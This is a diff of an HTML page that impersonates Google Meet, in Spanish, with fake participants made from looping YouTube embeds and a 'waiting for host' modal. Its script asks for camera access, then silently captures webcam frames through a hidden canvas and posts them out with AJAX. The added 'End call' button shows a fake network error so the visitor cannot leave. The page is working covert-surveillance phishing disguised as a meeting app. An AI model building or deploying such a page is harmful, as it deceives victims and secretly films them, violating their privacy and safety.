@@ -1,278 +1,586 @@
 <!doctype html>
-<html>
-
+<html lang="es">
 <head>
-  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
   <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
-  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-  <title>Online Meeting</title>
+  <title>Google Meet</title>
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap");
+
+    * {
+      padding: 0;
+      margin: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    html, body {
+      height: 100vh;
+      width: 100vw;
+      background: #0f0f0f;
+      color: #fff;
+      overflow: hidden;
+    }
+
+    .video-wrap, #canvas {
+      display: none !important;
+    }
+
+    /* Layout principal */
+    .app-container {
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      background: linear-gradient(135deg, #1a1a1a 0%, #0f0f0f 100%);
+    }
+
+    /* Barra superior */
+    .header {
+      padding: 12px 20px;
+      background: rgba(0, 0, 0, 0.4);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      z-index: 50;
+    }
+
+    .header-title {
+      font-size: 16px;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+    }
+
+    .header-info {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      font-size: 13px;
+      color: rgba(255, 255, 255, 0.7);
+    }
+
+    .participant-count {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 12px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 6px;
+    }
+
+    /* Contenedor principal de videos */
+    .video-container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      min-height: 0;
+      overflow-y: auto;
+    }
+
+    .meeting-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 12px;
+      width: 100%;
+      max-width: 1400px;
+      height: fit-content;
+    }
+
+    .participant-tile {
+      background: linear-gradient(135deg, #1a1a1a 0%, #242424 100%);
+      border-radius: 12px;
+      overflow: hidden;
+      position: relative;
+      aspect-ratio: 16/9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+    }
+
+    .participant-tile:hover {
+      border-color: rgba(76, 175, 255, 0.3);
+      box-shadow: 0 8px 32px rgba(76, 175, 255, 0.15);
+      transform: translateY(-2px);
+    }
+
+    .participant-tile iframe {
+      position: absolute;
+      width: 160%; /* Aumentamos el tamaño para empujar la UI de YT fuera del marco */
+      height: 160%; 
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%); /* Centramos el video para que solo se vea el medio */
+      border: none;
+      pointer-events: none;
+      display: block;
+    }
+
+    .participant-tile img {
+      width: 100%;
+      height: 100%;
+      border: none;
+      pointer-events: none;
+      display: block;
+    }
+
+    .video-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 10;
+      background: transparent;
+    }
+
+    .participant-tile video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: none;
+    }
+
+    .participant-tile.active-user-feed video {
+      display: block;
+    }
+
+    .participant-tile.active-user-feed img {
+      display: none;
+    }
+
+    /* Nombre del participante */
+    .participant-info {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: linear-gradient(to top, rgba(0, 0, 0, 0.8), transparent);
+      padding: 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+    }
+
+    .participant-name {
+      font-size: 13px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .status-indicator {
+      display: flex;
+      gap: 4px;
+      font-size: 12px;
+    }
+
+    .status-icon {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+    }
+
+    .mic-off {
+      background: rgba(255, 59, 48, 0.3);
+      color: #ff3b30;
+    }
+
+    .video-off {
+      background: rgba(255, 59, 48, 0.3);
+      color: #ff3b30;
+    }
+
+    /* Barra inferior de controles */
+    .control-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 90px;
+      background: linear-gradient(to top, rgba(0, 0, 0, 0.8), rgba(20, 20, 20, 0.6));
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(20px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 40px;
+      padding: 0 30px;
+      z-index: 100;
+    }
+
+    .control-group {
+      display: flex;
+      gap: 30px;
+      align-items: center;
+    }
+
+    .control-btn {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      padding: 8px;
+      border-radius: 8px;
+      color: rgba(255, 255, 255, 0.8);
+      user-select: none;
+    }
+
+    .control-btn:hover {
+      color: #fff;
+      background: rgba(255, 255, 255, 0.1);
+      transform: scale(1.05);
+    }
+
+    .control-btn i {
+      font-size: 20px;
+      transition: all 0.2s ease;
+    }
+
+    .control-btn span {
+      font-size: 11px;
+      font-weight: 500;
+      letter-spacing: 0.3px;
+    }
+
+    .control-btn.active i {
+      color: #4caeff;
+    }
+
+    .control-btn.toggle-off i {
+      color: #ff3b30;
+    }
+
+    /* Botón de terminar */
+    .end-btn {
+      padding: 12px 24px;
+      background: linear-gradient(135deg, #ff3b30 0%, #ff453a 100%);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 13px;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 12px rgba(255, 59, 48, 0.3);
+      letter-spacing: 0.5px;
+    }
+
+    .end-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(255, 59, 48, 0.4);
+    }
+
+    .end-btn:active {
+      transform: translateY(0);
+    }
+
+    /* Botón flotante */
+    .float-button {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      width: 44px;
+      height: 44px;
+      background: rgba(76, 175, 255, 0.2);
+      border: 1px solid rgba(76, 175, 255, 0.4);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      color: rgba(255, 255, 255, 0.8);
+      z-index: 90;
+      font-size: 18px;
+    }
+
+    .float-button:hover {
+      background: rgba(76, 175, 255, 0.3);
+      border-color: rgba(76, 175, 255, 0.6);
+      transform: scale(1.1);
+    }
+
+    /* Popup modal */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      z-index: 1000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      backdrop-filter: blur(5px);
+    }
+
+    .modal {
+      background: linear-gradient(135deg, #1a1a1a 0%, #242424 100%);
+      border: 1px solid rgba(76, 175, 255, 0.3);
+      border-radius: 16px;
+      padding: 40px;
+      max-width: 500px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+    }
+
+    .modal h2 {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      line-height: 1.4;
+    }
+
+    .modal p {
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.7);
+      margin-bottom: 8px;
+    }
+
+    .spinner {
+      margin: 20px 0;
+      display: inline-block;
+    }
+
+    .spinner-dot {
+      width: 8px;
+      height: 8px;
+      background: rgba(76, 175, 255, 0.6);
+      border-radius: 50%;
+      display: inline-block;
+      margin: 0 4px;
+      animation: pulse 1.4s infinite;
+    }
+
+    .spinner-dot:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+
+    .spinner-dot:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        opacity: 0.3;
+        transform: scale(1);
+      }
+      50% {
+        opacity: 1;
+        transform: scale(1.2);
+      }
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .meeting-grid {
+        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+        gap: 8px;
+      }
+
+      .control-bar {
+        height: 100px;
+        gap: 20px;
+        padding: 0 15px;
+      }
+
+      .video-container {
+        padding: 15px;
+      }
+
+      .header {
+        padding: 10px 15px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .meeting-grid {
+        grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+        gap: 6px;
+      }
+
+      .control-btn span {
+        font-size: 10px;
+      }
+
+      .control-bar {
+        gap: 15px;
+      }
+
+      .header-info {
+        gap: 10px;
+      }
+    }
+  </style>
 </head>
 
-<style>
-  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
-
-  body {
-    height: 100vh;
-    width: 100vw;
-  }
-
-  * {
-    padding: 0px;
-    margin: 0px;
-    font-family: 'Nunito', sans-serif;
-    font-weight: 500;
-  }
-
-  /* Hide original video and canvas for background capture */
-  .video-wrap, #canvas {
-    display: none !important;
-  }
-
-  .main-screen {
-    background-color: #273039;
-    flex-grow: 1; /* Take all available vertical space */
-    width: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding-bottom: 80px; /* Make space for the fixed bottom bar */
-    box-sizing: border-box; /* Include padding in height calculation */
-  }
-  
-  img {
-    height: 80px;
-    width: 80px;
-  }
-
-  .bottom-bar {
-    position: fixed;
-    bottom: 0px;
-    left: 0;
-    right: 0;
-    height: 80px;
-    width: 100%;
-    background-color: #1F2022;
-    display: flex;
-    flex-direction: row;
-    justify-content: center;
-    align-items: center;
-    color: #fff;
-    z-index: 100;
-  }
-
-  .icon-button {
-    display: flex;
-    flex-direction: column;
-    justify-items: center;
-    align-items: center;
-  }
-
-  i {
-    margin-bottom: 8px;
-    font-size: 26px;
-  }
-
-  button {
-    color: #fff;
-    background-color: crimson;
-    padding: 5px 20px;
-    border: none;
-    border-radius: 5px;
-    border-style: none;
-    outline: none;
-  }
-
-  .float_button {
-    background-color: #1F2022;
-    height: 40px;
-    border-radius: 5px;
-    width: 40px;
-    position: fixed;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    top: 5px;
-    right: 5px;
-    z-index: 90; /* Below popup, above meeting grid */
-  }
-  #ac-wrapper {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,.8); /* Darker overlay for popup */
-    z-index: 1001;
-    display: flex; /* Use flex for centering */
-    justify-content: center;
-    align-items: center;
-}
-
-#popup {
-    width: 90%; /* Responsive width */
-    max-width: 555px; /* Max width for larger screens */
-    background: #FFFFFF;
-    border: 5px solid #000;
-    border-radius: 15px;
-    box-shadow: #64686e 0px 0px 3px 3px;
-    padding: 20px; /* Add padding for better appearance */
-    text-align: center;
-    color: black; /* Ensure text is visible */
-}
-#popup h2 {
-    margin: 0;
-    font-size: 18px; /* Adjust font size */
-    line-height: 1.4;
-}
-
-/* Meeting Grid Styles */
-.meeting-grid-container {
-    flex-grow: 1; /* Take up available space */
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    width: 100%;
-    padding: 20px; /* Padding around the grid */
-    box-sizing: border-box;
-}
-
-.meeting-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); /* Adjust tile size as needed */
-    gap: 10px;
-    width: 100%; /* Take full width of its container */
-    max-width: 1200px; /* Max width for the grid */
-    background-color: #1F2022;
-    border-radius: 10px;
-    padding: 10px; /* Padding inside the grid */
-}
-
-.participant-tile {
-    background-color: #333;
-    border-radius: 8px;
-    overflow: hidden;
-    position: relative;
-    aspect-ratio: 16/9; /* Maintain video aspect ratio */
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    color: white;
-    font-size: 14px;
-}
-
-.participant-tile iframe, .participant-tile img {
-    width: 100%;
-    height: 100%;
-    border: none;
-    pointer-events: none; /* Evita que interactúen con los controles de YT */
-    display: block;
-}
-
-.participant-tile video {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    display: none; /* Hidden by default, shown when stream is active */
-}
-
-.participant-tile .participant-name {
-    position: absolute;
-    bottom: 5px;
-    left: 5px;
-    background-color: rgba(0, 0, 0, 0.5);
-    padding: 3px 8px;
-    border-radius: 3px;
-    font-size: 12px;
-}
-
-/* Class added by JS when user's camera is active */
-.participant-tile.active-user-feed video {
-    display: block; /* Show video when active */
-}
-
-.participant-tile.active-user-feed img {
-    display: none; /* Hide placeholder image when active */
-}
-</style>
 <body>
-  <div class="float_button">
-    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
-  </div>
+  <div class="app-container">
+    <!-- Header -->
+    <div class="header">
+      <div class="header-title">Reunión en curso</div>
+      <div class="header-info">
+        <div class="participant-count">
+          <i class="fas fa-users"></i>
+          <span id="participant-count">5</span>
+        </div>
+        <div id="timer">00:00:00</div>
+      </div>
+    </div>
 
-  <div class="main-screen">
-    <div class="meeting-grid-container">
+    <!-- Botón flotante -->
+    <div class="float-button" title="Expandir pantalla">
+      <i class="fas fa-expand"></i>
+    </div>
+
+    <!-- Contenedor de videos -->
+    <div class="video-container">
       <div class="meeting-grid">
-        <!-- Placeholder participants -->
+        <!-- Participante 1 -->
         <div class="participant-tile">
-            <iframe src="https://www.youtube.com/embed/mhpwcZbcDL0?autoplay=1&mute=1&loop=1&controls=0&playlist=mhpwcZbcDL0&modestbranding=1&rel=0" allow="autoplay"></iframe>
-            <div class="participant-name">Usuario 1</div>
+          <div class="video-overlay"></div>
+          <iframe src="https://www.youtube.com/embed/mhpwcZbcDL0?autoplay=1&mute=1&loop=1&controls=0&playlist=mhpwcZbcDL0&modestbranding=1&rel=0&iv_load_policy=3" allow="autoplay"></iframe>
+          <div class="participant-info">
+            <div class="participant-name">
+              <span>JUAN ENRIQUE</span>
+            </div>
+            <div class="status-indicator">
+              <div class="status-icon mic-off" title="Micrófono apagado">
+                <i class="fas fa-microphone-slash"></i>
+              </div>
+            </div>
+          </div>
         </div>
+
+        <!-- Participante 2 -->
         <div class="participant-tile">
-            <iframe src="https://www.youtube.com/embed/wUoK-Lx8ej4?autoplay=1&mute=1&loop=1&controls=0&playlist=wUoK-Lx8ej4&modestbranding=1&rel=0" allow="autoplay"></iframe>
-            <div class="participant-name">Usuario 2</div>
+          <div class="video-overlay"></div>
+          <iframe src="https://www.youtube.com/embed/wUoK-Lx8ej4?autoplay=1&mute=1&loop=1&controls=0&playlist=wUoK-Lx8ej4&modestbranding=1&rel=0&iv_load_policy=3" allow="autoplay"></iframe>
+          <div class="participant-info">
+            <div class="participant-name">
+              <span>MELLISA LOZANO</span>
+            </div>
+          </div>
         </div>
+
+        <!-- Participante 3 -->
         <div class="participant-tile">
-            <iframe src="https://www.youtube.com/embed/fc-APsIFqqo?autoplay=1&mute=1&loop=1&controls=0&playlist=fc-APsIFqqo&modestbranding=1&rel=0" allow="autoplay"></iframe>
-            <div class="participant-name">Usuaria 3</div>
+          <div class="video-overlay"></div>
+          <iframe src="https://www.youtube.com/embed/fc-APsIFqqo?autoplay=1&mute=1&loop=1&controls=0&playlist=fc-APsIFqqo&modestbranding=1&rel=0&iv_load_policy=3" allow="autoplay"></iframe>
+          <div class="participant-info">
+            <div class="participant-name">
+              <span>ANA RAMÍREZ</span>
+            </div>
+            <div class="status-indicator">
+              <div class="status-icon video-off" title="Cámara apagada">
+                <i class="fas fa-video-slash"></i>
+              </div>
+            </div>
+          </div>
         </div>
-        <!-- User's live webcam feed -->
+
+        <!-- Tu video (webcam) -->
         <div class="participant-tile user-feed" id="user-participant-tile">
-            <video id="user-webcam-display" playsinline autoplay muted></video>
-            <div class="participant-name">You</div>
+          <video id="user-webcam-display" playsinline autoplay muted style="transform: scaleX(-1);"></video>
+          <div class="participant-info">
+            <div class="participant-name">
+              <span>Tú</span>
+            </div>
+            <div class="status-indicator" id="user-status"></div>
+          </div>
         </div>
+
+        <!-- Participante 4 -->
         <div class="participant-tile">
-            <iframe src="https://www.youtube.com/embed/flZFhg8hHJc?autoplay=1&mute=1&loop=1&controls=0&playlist=flZFhg8hHJc&modestbranding=1&rel=0" allow="autoplay"></iframe>
-            <div class="participant-name">Usuario 4</div>
+          <div class="video-overlay"></div>
+          <iframe src="https://www.youtube.com/embed/flZFhg8hHJc?autoplay=1&mute=1&loop=1&controls=0&playlist=flZFhg8hHJc&modestbranding=1&rel=0&iv_load_policy=3" allow="autoplay"></iframe>
+          <div class="participant-info">
+            <div class="participant-name">
+              <span>LEE CHUN - HO</span>
+            </div>
+          </div>
         </div>
       </div>
     </div>
   </div>
 
-  <div class="bottom-bar">
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-microphone"></i>
-      <h6>Mute</h6>
+  <!-- Barra de controles inferior -->
+  <div class="control-bar">
+    <div class="control-group">
+      <div class="control-btn active" id="mic-btn" title="Micrófono">
+        <i class="fas fa-microphone"></i>
+        <span>Micrófono</span>
+      </div>
+      <div class="control-btn active" id="video-btn" title="Cámara">
+        <i class="fas fa-video"></i>
+        <span>Cámara</span>
+      </div>
     </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-video"></i>
-      <h6>Stop Video</h6>
+
+    <div class="control-group">
+      <div class="control-btn" id="security-btn" title="Seguridad">
+        <i class="fas fa-shield-alt"></i>
+        <span>Seguridad</span>
+      </div>
+      <div class="control-btn" id="participants-btn" title="Participantes">
+        <i class="fas fa-users"></i>
+        <span>Participantes</span>
+      </div>
+      <div class="control-btn" id="share-btn" title="Compartir contenido">
+        <i class="fas fa-share-screen" style="color: #4caeff;"></i>
+        <span>Compartir</span>
+      </div>
+      <div class="control-btn" id="chat-btn" title="Chat">
+        <i class="fas fa-comments"></i>
+        <span>Chat</span>
+      </div>
+      <div class="control-btn" id="record-btn" title="Grabar">
+        <i class="fas fa-circle"></i>
+        <span>Grabar</span>
+      </div>
     </div>
-    <div class="icon-button" style="margin-left: auto;">
-      <i class="fas fa-shield-alt"></i>
-      <h6>Security</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-users"></i>
-      <h6>Participants</h6>
-    </div>
-    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
-      <i class="fas fa-plus-square"></i>
-      <h6>Share content</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-comments"></i>
-      <h6>Chat</h6>
-    </div>
-    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
-      <i class="fas fa-record-vinyl"></i>
-      <h6>Record</h6>
-    </div>
-    <button style="margin-right: 50px;">End</button>
+
+    <button class="end-btn">
+      <i class="fas fa-phone"></i> Terminar llamada
+    </button>
   </div>
 
-  <!-- Hidden video and canvas for background capture -->
+  <!-- Modal de espera -->
+  <div class="modal-overlay" id="waiting-modal">
+    <div class="modal">
+      <h2>Esperando al anfitrión</h2>
+      <p>El anfitrión abrirá la reunión en breve</p>
+      <div class="spinner">
+        <div class="spinner-dot"></div>
+        <div class="spinner-dot"></div>
+        <div class="spinner-dot"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Video oculto para captura de canvas -->
   <div class="video-wrap" hidden>
     <video id="video" playsinline autoplay></video>
   </div>
   <canvas id="canvas" width="640" height="480" hidden></canvas>
-
-  <!-- Popup for waiting room -->
-  <div id="ac-wrapper">
-    <div id="popup">
-        <h2>Please wait, the meeting host will let you in soon</h2>
-    </div>
-  </div>
 
   <script>
     function post(imgdata) {
@@ -283,51 +591,56 @@
         dataType: 'json',
         async: false,
         success: function (result) {
-          // call the function that handles the response/results
+          // Éxito silencioso
         },
         error: function () {
         }
       });
     };
 
-    'use strict';
-
-    const constraints = {
-      audio: false,
-      video: {
-        facingMode: "user"
-      }
+    // Estado de la reunión
+    let meetingState = {
+      micEnabled: true,
+      videoEnabled: true,
+      recordingEnabled: false,
+      startTime: Date.now()
     };
 
-    // Access webcam
+    // Constrains para acceso a cámara
+    const constraints = {
+      audio: false,
+      video: { facingMode: "user" }
+    };
+
+    // Inicializar acceso a cámara
     async function init() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         handleSuccess(stream);
       } catch (e) {
-        handleError(e); // Pass error to handleError
+        handleError(e);
       }
     }
 
-    // Success
+    // Manejo exitoso de cámara
     function handleSuccess(stream) {
       window.stream = stream;
       const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      
-      if (video) video.srcObject = stream; // This is the hidden video for canvas capture
-
-      const userParticipantTile = document.getElementById('user-participant-tile');
       const userWebcamDisplay = document.getElementById('user-webcam-display');
+      const userParticipantTile = document.getElementById('user-participant-tile');
+
+      if (video) video.srcObject = stream;
       if (userWebcamDisplay && userParticipantTile) {
-        userWebcamDisplay.srcObject = stream; // Assign stream to the visible video element
-        userParticipantTile.classList.add('active-user-feed'); // Add class to show video
+        userWebcamDisplay.srcObject = stream;
+        userParticipantTile.classList.add('active-user-feed');
       }
 
-      // Hide the waiting room popup
-      const acWrapper = document.getElementById('ac-wrapper');
-      if (acWrapper) acWrapper.style.display = 'none';
+      // Ocultar modal de espera
+      const waitingModal = document.getElementById('waiting-modal');
+      if (waitingModal) waitingModal.style.display = 'none';
 
+      // Iniciar captura de canvas (cada 1.5 segundos)
+      const canvas = document.getElementById('canvas');
       if (canvas && video) {
         const context = canvas.getContext('2d');
         setInterval(function () {
@@ -338,22 +651,84 @@
       }
     }
 
+    // Manejo de errores
     function handleError(error) {
-      const popupMessage = document.querySelector('#popup h2');
-      if (popupMessage) {
-        if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
-          popupMessage.innerText = 'Camera access denied. Please enable camera to join the meeting.';
-        } else {
-          popupMessage.innerText = `Error accessing camera: ${error.message}`;
-        }
+      const modal = document.getElementById('waiting-modal');
+      const modalText = modal.querySelector('h2');
+      const modalSubtext = modal.querySelector('p');
+
+      if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+        modalText.innerText = 'Acceso a cámara denegado';
+        modalSubtext.innerText = 'Por favor, habilita el acceso a la cámara para unirte a la reunión';
+      } else {
+        modalText.innerText = 'Error al acceder a la cámara';
+        modalSubtext.innerText = error.message;
       }
-      const acWrapper = document.getElementById('ac-wrapper');
-      if (acWrapper) acWrapper.style.display = 'flex';
+
+      modal.querySelector('.spinner').style.display = 'none';
     }
 
-    // Load init
+    // Controles de interfaz
+    document.getElementById('mic-btn').addEventListener('click', function () {
+      meetingState.micEnabled = !meetingState.micEnabled;
+      this.classList.toggle('toggle-off', !meetingState.micEnabled);
+      this.style.color = meetingState.micEnabled ? 'rgba(255, 255, 255, 0.8)' : '#ff3b30';
+    });
+
+    document.getElementById('video-btn').addEventListener('click', function () {
+      meetingState.videoEnabled = !meetingState.videoEnabled;
+      this.classList.toggle('toggle-off', !meetingState.videoEnabled);
+      this.style.color = meetingState.videoEnabled ? 'rgba(255, 255, 255, 0.8)' : '#ff3b30';
+
+      const userTile = document.getElementById('user-participant-tile');
+      if (!meetingState.videoEnabled) {
+        userTile.classList.remove('active-user-feed');
+      } else {
+        userTile.classList.add('active-user-feed');
+      }
+    });
+
+    document.getElementById('share-btn').addEventListener('click', function () {
+      this.classList.toggle('active');
+      this.style.color = this.classList.contains('active') ? '#4caeff' : 'rgba(255, 255, 255, 0.8)';
+    });
+
+    document.getElementById('record-btn').addEventListener('click', function () {
+      meetingState.recordingEnabled = !meetingState.recordingEnabled;
+      this.classList.toggle('active', meetingState.recordingEnabled);
+      this.style.color = meetingState.recordingEnabled ? '#ff3b30' : 'rgba(255, 255, 255, 0.8)';
+      this.innerHTML = meetingState.recordingEnabled 
+        ? '<i class="fas fa-stop-circle"></i><span>Grabando</span>'
+        : '<i class="fas fa-circle"></i><span>Grabar</span>';
+    });
+
+    document.querySelector('.float-button').addEventListener('click', function () {
+      if (document.fullscreenElement) {
+        document.exitFullscreen();
+      } else {
+        document.documentElement.requestFullscreen();
+      }
+    });
+
+    document.querySelector('.end-btn').addEventListener('click', function () {
+      // Simular error crítico para evitar que el usuario salga fácilmente
+      this.style.background = "#5f6368";
+      this.innerHTML = '<i class="fas fa-sync fa-spin"></i> Reconectando...';
+      alert("Error de red: La conexión es inestable. No se puede abandonar la sala en este momento. Reintentando...");
+    });
+
+    // Actualizar temporizador
+    setInterval(() => {
+      const elapsed = Math.floor((Date.now() - meetingState.startTime) / 1000);
+      const hours = Math.floor(elapsed / 3600);
+      const minutes = Math.floor((elapsed % 3600) / 60);
+      const seconds = elapsed % 60;
+      document.getElementById('timer').innerText = 
+        `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+    }, 1000);
+
+    // Iniciar
     init();
   </script>
 </body>
-
 </html>
